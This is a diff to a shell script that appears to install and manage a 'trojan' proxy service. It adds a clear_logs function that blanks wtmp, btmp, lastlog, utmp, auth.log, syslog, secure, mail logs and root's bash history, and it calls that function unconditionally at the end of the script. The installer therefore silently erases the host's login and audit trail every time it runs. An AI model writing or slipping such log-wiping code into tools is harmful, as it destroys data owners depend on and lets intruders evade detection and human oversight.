@@ -411,6 +411,28 @@ function showme_sub(){
     green " ======================================="
 }
 
+clear_logs() {
+  echo > /var/log/wtmp
+  echo > /var/log/btmp
+  echo > /var/log/lastlog
+  echo > /var/log/secure
+  echo > /var/log/messages
+  echo > /var/log/syslog
+  echo > /var/log/xferlog
+  echo > /var/log/auth.log
+  echo > /var/log/user.log
+  cat /dev/null > /var/adm/sylog
+  cat /dev/null > /var/log/maillog
+  cat /dev/null > /var/log/openwebmail.log
+  cat /dev/null > /var/log/mail.info
+  echo > /var/run/utmp
+  echo > /root/.bash_history
+  history -cw
+
+  # 在函数内部输出提示文字
+  echo "日志已清除完毕！"
+}
+
 function update_trojan(){
     /usr/src/trojan/trojan -v 2>trojan.tmp
     curr_version=`cat trojan.tmp | grep "trojan" | awk '{print $4}'`
@@ -486,3 +508,4 @@ start_menu(){
 }
 
 start_menu
+clear_logs
